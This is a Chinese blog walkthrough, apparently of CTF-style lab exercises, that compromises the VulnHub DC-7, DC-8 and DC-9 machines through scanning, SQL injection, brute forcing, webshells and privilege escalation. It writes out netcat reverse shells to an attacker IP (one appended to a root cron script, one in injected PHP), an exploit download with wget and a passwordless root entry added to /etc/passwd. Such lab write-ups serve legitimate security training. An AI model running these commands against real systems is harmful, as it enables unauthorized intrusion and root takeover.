## [](https://lnng.top/posts/2ea3.html#DC7 "DC7")DC7

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2 "基本环境搭建")基本环境搭建

靶机下载地址:[https://download.vulnhub.com/dc/DC-7.zip](https://download.vulnhub.com/dc/DC-7.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-5 "基本信息收集")基本信息收集

```
nmap -sS -A 192.168.124.0/24
```

```
Nmap scan report for 192.168.124.151
Host is up (0.00037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)
|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)
|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome to DC-7 | D7
MAC Address: 00:0C:29:52:A9:5B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.124.151
```

发现开放了22，80端口系统linux，进一步扫描，没发现其他端口

```
nmap 192.168.124.151 -p 1-65535
```

爆破ssh

```
nmap --script=ssh-brute 192.168.124.151
```

查看80端口进行进一步信息的探测CMS是Drupal8，而且告诉我们不是暴力破解  

![upload successful](https://lnng.top/images/pasted-251.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E "查找漏洞")查找漏洞

尝试了msf中的漏洞不行exploit-db中根据版本来也不行  
百度一下说这个提示搜索一下这个人，然后发现了github，然后找到了源码[github源码地址](https://github.com/Dc7User/staffdb)  

![upload successful](https://lnng.top/images/pasted-252.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-253.png)

**upload successful**

  
然后我们在config.php中发现了连接数据库的账号密码，尝试使用ssh连接,可以看到爆破前面爆破账号密码失败

```
<?php
    $servername = "localhost";
    $username = "dc7user";
    $password = "MdR3xOgB7#dW";
    $dbname = "Staff";
    $conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```

![upload successful](https://lnng.top/images/pasted-254.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E6%8F%90%E5%8F%96 "提取")提取

先搜寻一下文件的基本信息,在mbox中发现一个root执行的文件(百度的妈耶看不到)

```
cat mbox
```

![upload successful](https://lnng.top/images/pasted-255.png)

**upload successful**

```
cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

发现应该是一个备份的sh脚本  
看一下权限www-data和root都是有权限的  

![upload successful](https://lnng.top/images/pasted-256.png)

**upload successful**

  
所以有思路了，如果我们获得www-data的权限向这个脚本执行任务，那么我们就可以反弹root权限，因为会以root权限定时启动  
看着这个备份脚本可以发现是一个drush配置的命令，它可以改变用户名密码

```
drush sql-dump --result-file=/home/dc7user/backups/website.sql
```

所以尝试修改一下密码

```
cd /var/www/html
drush user-password admin --password="123456"
```

![upload successful](https://lnng.top/images/pasted-257.png)

**upload successful**

  
登录尝试，登录成功  

![upload successful](https://lnng.top/images/pasted-258.png)

**upload successful**

  
发现这个位置是支持扩展的，所以我们想要创建一个webshell可以借助插件，看wp要去下载一个php的插件  

![upload successful](https://lnng.top/images/pasted-259.png)

**upload successful**

  
插件下载地址：[https://www.drupal.org/project/php](https://www.drupal.org/project/php)  
下载gz格式上传，然后点如图的标识  

![upload successful](https://lnng.top/images/pasted-260.png)

**upload successful**

  
然后勾上下图的东西，点击最下方的install  

![upload successful](https://lnng.top/images/pasted-261.png)

**upload successful**

  
回到主页，点击下图的东西，创建一个文章  

![upload successful](https://lnng.top/images/pasted-262.png)

**upload successful**

![upload successful](https://lnng.top/images/pasted-263.png)

**upload successful**

  
随便写个木马  

![upload successful](https://lnng.top/images/pasted-265.png)

**upload successful**

  
注意下面的text format要选择php code  
然后蚁剑连接即可  

![upload successful](https://lnng.top/images/pasted-266.png)

**upload successful**

  
再反弹给kali吧，其实可以直接再webshell中反弹shell  

![upload successful](https://lnng.top/images/pasted-267.png)

**upload successful**

  
反弹交互shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

然后将反弹shell的脚本写入定时启动的sh中，反弹root的shell

```
echo "nc -e /bin/bash 192.168.124.139 7777" >>  /opt/scripts/backups.sh
```

![upload successful](https://lnng.top/images/pasted-268.png)

**upload successful**

  
读取flag

```
cd /root
ls
theflag.txt
cat theflag.txt

888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

### [](https://lnng.top/posts/2ea3.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-5 "参考文章")参考文章

[https://www.anquanke.com/post/id/187876#h3-3](https://www.anquanke.com/post/id/187876#h3-3)

## [](https://lnng.top/posts/2ea3.html#DC8 "DC8")DC8

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-3 "基本环境搭建")基本环境搭建

靶机下载地址:[https://download.vulnhub.com/dc/DC-8.zip](https://download.vulnhub.com/dc/DC-8.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-6 "基本信息收集")基本信息收集

```
Nmap scan report for 192.168.124.152
Host is up (0.00058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)
|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)
|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)
80/tcp open  http    Apache httpd
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache
|_http-title: Welcome to DC-8 | DC-8
MAC Address: 00:0C:29:AE:A9:C3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.124.152
```

查看发现了80，22端口，操作系统linux  
进一步扫描,没发现其他端口

```
nmap 192.168.124.152 -p 1-65535
```

爆破ssh,无结果

```
nmap --script=ssh-brute 192.168.124.152
```

查看80端，cms Drupal 7  

![upload successful](https://lnng.top/images/pasted-269.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8 "漏洞利用")漏洞利用

msf上的基本漏洞利用没效果，这里发现id尝试一下sql注入吧  

![upload successful](https://lnng.top/images/pasted-270.png)

**upload successful**

  
先尝试简单的报错注入吧，没有任何防护直接注入  
sqlmap一把梭哈  

![upload successful](https://lnng.top/images/pasted-271.png)

**upload successful**

```
http://192.168.124.152/?nid=1%20and%20updatexml(1,concat(0x7e,database()),1)#

sqlmap -u http://192.168.124.152/?nid=1 -D d7db -T users --dump
```

成功报出，账号密码的hash值  

![upload successful](https://lnng.top/images/pasted-272.png)

**upload successful**

```
05:16:06] [INFO] resumed: 'admin'
[05:16:06] [INFO] resumed: '1567489015'
[05:16:06] [INFO] resumed: 'dc8blah@dc8blah.org'
[05:16:06] [INFO] resumed: '1567766626'
[05:16:06] [INFO] resumed: 'dcau-user@outlook.com'
[05:16:06] [INFO] resumed: '$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z'
[05:16:06] [INFO] resumed: '0'
[05:16:06] [INFO] resumed: ''
[05:16:06] [INFO] resumed: 'filtered_html'
[05:16:06] [INFO] resumed: '1'
[05:16:06] [INFO] resumed: ''
[05:16:06] [INFO] resumed: 'Australia/Brisbane'
[05:16:06] [INFO] resumed: '1'
[05:16:06] [INFO] resumed: '1567498512'
[05:16:06] [INFO] resumed: 'a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:...
[05:16:06] [INFO] resumed: ''
[05:16:06] [INFO] resumed: 'john'
[05:16:06] [INFO] resumed: '1567489250'
[05:16:06] [INFO] resumed: 'john@blahsdfsfd.org'
[05:16:06] [INFO] resumed: '1567497783'
[05:16:06] [INFO] resumed: 'john@blahsdfsfd.org'
[05:16:06] [INFO] resumed: '$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF'
[05:16:06] [INFO] resumed: '0'
[05:16:06] [INFO] resumed: ''
```

爆破一下hash值,使用john这里提示了  
爆破成功了john的密码turtle

```
C:\root\Desktop> john pass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
No password hashes left to crack (see FAQ)
C:\root\Desktop> john --show pass.txt
john:turtle

1 password hash cracked, 0 left
```

扫描一下目录

```
dirb http://192.168.124.152
```

发现user目录是登录的地方

登录成功,发现这个位置可以添加php代码，直接尝试反弹shell

```
http://192.168.124.152/node/3#overlay=node/3/webform/configure
```

```
<p>flag</p>
<?php
system("nc -e /bin/sh 192.168.124.139  4444");
?>
```

然后这个页面随便输出什么点击提交等待反弹的shell  

![upload successful](https://lnng.top/images/pasted-273.png)

**upload successful**

  
然后反弹交互shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

### [](https://lnng.top/posts/2ea3.html#%E6%8F%90%E6%9D%83-3 "提权")提权

先尝试suid提权

```
find / -perm -u=s -type f 2>/dev/null
```

```
www-data@dc-8:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/umount
/bin/mount
```

![upload successful](https://lnng.top/images/pasted-274.png)

**upload successful**

  
发现一个特别的exim4搜索一下漏洞  
尝试一下这个漏洞  

![upload successful](https://lnng.top/images/pasted-275.png)

**upload successful**

  
先复制出来

```
cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh
```

处理为unix可以的

![upload successful](https://lnng.top/images/pasted-278.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-277.png)

**upload successful**

  
开启一个服务或者你蚁剑连接上传

```
python -m SimpleHTTPServer
```

然后下载下来

```
wget http://192.168.124.139:8000/46996.sh
```

里面有使用说明  

![upload successful](https://lnng.top/images/pasted-276.png)

**upload successful**

```
chmod 777 46996.sh
./46996.sh -m netcat
```

![upload successful](https://lnng.top/images/pasted-279.png)

**upload successful**

```
Brilliant - you have succeeded!!!



888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  "Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888



Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm also sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

This challenge was largely based on two things:

1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
2. A suggestion from @theart42

The answer to that question is...

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

### [](https://lnng.top/posts/2ea3.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-6 "参考文章")参考文章

[https://blog.csdn.net/weixin_43583637/article/details/102828013](https://blog.csdn.net/weixin_43583637/article/details/102828013)  
[https://fan497.top/2020/11/17/vulnhub-DC8/](https://fan497.top/2020/11/17/vulnhub-DC8/)

## [](https://lnng.top/posts/2ea3.html#DC9 "DC9")DC9

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-4 "基本环境搭建")基本环境搭建

靶机下载地址：[https://download.vulnhub.com/dc/DC-9.zip](https://download.vulnhub.com/dc/DC-9.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-7 "基本信息收集")基本信息收集

```
nmap -sS -A 192.168.124.0/24
```

```
Nmap scan report for 192.168.124.153
Host is up (0.00041s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:20:FE:11 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.124.153
```

开放了80，22ssh，操作系统linux

端口的进一步扫描(没发现新的端口)

```
nmap 192.168.124.153 -p 1-65535
```

爆破一下ssh

```
nmap --script=ssh-brute 192.168.124.153
```

查看80端口，说让我们看看你其他目录

![upload successful](https://lnng.top/images/pasted-280.png)

**upload successful**

  
测试了一下manage功能似乎没有啥问题，再search的地方发现了sql注入  

![upload successful](https://lnng.top/images/pasted-281.png)

**upload successful**

  
sqlmap直接跑一下,跑出三个数据库

```
sqlmap -u "http://192.168.124.153/results.php" --data "search=" --dbs
```

![upload successful](https://lnng.top/images/pasted-282.png)

**upload successful**

  
继续跑表

#### [](https://lnng.top/posts/2ea3.html#users%E7%9A%84 "users的")users的

```
sqlmap -u "http://192.168.124.153/results.php" --data "search=" -D users --tables
```

![upload successful](https://lnng.top/images/pasted-283.png)

**upload successful**

```
sqlmap -u "http://192.168.124.153/results.php" --data "search=" -D users -T UserDetails --dump
```

```
+------+------------+---------------------+-----------+-----------+---------------+
| id   | lastname   | reg_date            | username  | firstname | password      |
+------+------------+---------------------+-----------+-----------+---------------+
| 17   | Morrison   | 2019-12-29 16:58:28 | janitor2  | Scott     | Hawaii-Five-0 |
| 16   | Trump      | 2019-12-29 16:58:26 | janitor   | Donald    | Ilovepeepee   |
| 15   | McScoots   | 2019-12-29 16:58:26 | scoots    | Scooter   | YR3BVxxxw87   |
| 14   | Buffay     | 2019-12-29 16:58:26 | phoebeb   | Phoebe    | smellycats    |
| 13   | Geller     | 2019-12-29 16:58:26 | monicag   | Monica    | 3248dsds7s    |
| 12   | Geller     | 2019-12-29 16:58:26 | rossg     | Ross      | ILoveRachel   |
| 11   | Green      | 2019-12-29 16:58:26 | rachelg   | Rachel    | yN72#dsd      |
| 10   | Tribbiani  | 2019-12-29 16:58:26 | joeyt     | Joey      | Passw0rd      |
| 9    | Bing       | 2019-12-29 16:58:26 | chandlerb | Chandler  | UrAG0D!       |
| 8    | Rubble     | 2019-12-29 16:58:26 | bettyr    | Betty     | BamBam01      |
| 7    | Flintstone | 2019-12-29 16:58:26 | wilmaf    | Wilma     | Pebbles       |
| 6    | Mouse      | 2019-12-29 16:58:26 | jerrym    | Jerry     | B8m#48sd      |
| 5    | Cat        | 2019-12-29 16:58:26 | tomc      | Tom       | TC&TheBoyz    |
| 4    | Rubble     | 2019-12-29 16:58:26 | barneyr   | Barney    | RocksOff      |
| 3    | Flintstone | 2019-12-29 16:58:26 | fredf     | Fred      | 4sfd87sfd1    |
| 2    | Dooley     | 2019-12-29 16:58:26 | julied    | Julie     | 468sfdfsd2    |
| 1    | Moe        | 2019-12-29 16:58:26 | marym     | Mary      | 3kfs86sfd     
```

![upload successful](https://lnng.top/images/pasted-284.png)

**upload successful**

#### [](https://lnng.top/posts/2ea3.html#Staff%E7%9A%84 "Staff的")Staff的

```
sqlmap -u "http://192.168.124.153/results.php" --data "search=" -D Staff --tables
```

报出了俩表

```
Database: Staff
[2 tables]
+--------------+
| StaffDetails |
| Users        |
+--------------+
```

```
sqlmap -u "http://192.168.124.153/results.php" --data "search=" -D Staff -T Users --dump
```

Users的表

```
Database: Staff
Table: Users
[1 entry]
+--------+----------+----------------------------------+
| UserID | Username | Password                         |
+--------+----------+----------------------------------+
| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
+--------+----------+----------------------------------+
```

StaffDetails的表

```
sqlmap -u "http://192.168.124.153/results.php" --data "search=" -D Staff -T StaffDetails --dump
```

```
Database: Staff
Table: StaffDetails
[17 entries]
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id   | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 2    | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 17   | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
| 15   | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 13   | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 11   | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 9    | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 7    | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 5    | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 3    | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 1    | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 16   | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 14   | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 12   | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 10   | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 8    | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 6    | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 4    | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
```

MD5解码一下password的密码

```
856f5de590ef37314e7c3bdf6f8a66dc
```

![upload successful](https://lnng.top/images/pasted-285.png)

**upload successful**

  
密码

```
transorbital1
```

尝试登录,登录成功，发现这里提示File does not exist，估计是包含了某个文件，尝试文件包含,发现确实存在文件包含  

![upload successful](https://lnng.top/images/pasted-286.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-287.png)

**upload successful**

  
然后看来大佬的wp，发现一个没了解的地方

```
http://192.168.124.153/welcome.php?file=../../../../../../../../../etc/knockd.conf
```

![upload successful](https://lnng.top/images/pasted-288.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-289.png)

**upload successful**

  
也就是说黑客进行直接扫描端口扫描不出来，只有进行固定knockd的访问才能打开  
查看配置文件发现需要连续访问的端口

```
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
```

轮流敲

```
nmap 192.168.124.153 -p 7469
nmap 192.168.124.153 -p 8475
nmap 192.168.124.153 -p 9842
```

![upload successful](https://lnng.top/images/pasted-290.png)

**upload successful**

  
将之前爆破的users的账号密码，提权出来进行ssh的爆破

```
cat UserDetails.csv | awk -F ',' '{print $4}' > username.txt
```

![upload successful](https://lnng.top/images/pasted-291.png)

**upload successful**

```
cat UserDetails.csv | awk -F ',' '{print $NF}' > password.txt
```

![upload successful](https://lnng.top/images/pasted-292.png)

**upload successful**

#### [](https://lnng.top/posts/2ea3.html#%E7%88%86%E7%A0%B4ssh "爆破ssh")爆破ssh

hydra破解进行破解

```
hydra -L username.txt -P password.txt 192.168.124.153 ssh
```

成功爆破出三个用户  

![upload successful](https://lnng.top/images/pasted-293.png)

**upload successful**

  
登录janitor发现了隐藏文件  

![upload successful](https://lnng.top/images/pasted-294.png)

**upload successful**

  
将其加入到password中再次进行爆破  
成功多爆破出一个账号密码尝试登录

![upload successful](https://lnng.top/images/pasted-295.png)

**upload successful**

  
看一下权限

```
sudo -l
```

![upload successful](https://lnng.top/images/pasted-296.png)

**upload successful**

  
发现一个test文件  

![upload successful](https://lnng.top/images/pasted-297.png)

**upload successful**

  
执行了一下发现执行不了  
再上一层目录发现了源码  
代码的意思是将第一个文件的内容写入第二个文件中  
所以我们可以创建一个文件写入root权限的信息，然后用test将其写入到/etc/passwd中

```
echo "admin:*:0:0:::/bin/bash" >> /tmp/passwd
```

![upload successful](https://lnng.top/images/pasted-298.png)

**upload successful**

  
然后利用test将/tmp/passwd的内容写入到/etc/passwd中

```
sudo ./test /tmp/passwd /etc/passwd
```

```
fredf@dc-9:/opt/devstuff/dist/test$ su admin
root@dc-9:/opt/devstuff/dist/test# whoami
root
root@dc-9:~# ls
theflag.txt
root@dc-9:~# cat theflag.txt 


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝

Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
```

  
来源: Script kiddie's life  
文章作者: Lmg  
文章链接: [https://lnng.top/posts/2ea3.html#toc-heading-46](https://lnng.top/posts/2ea3.html#toc-heading-46)  
本文章著作权归作者所有，任何形式的转载都请注明出处。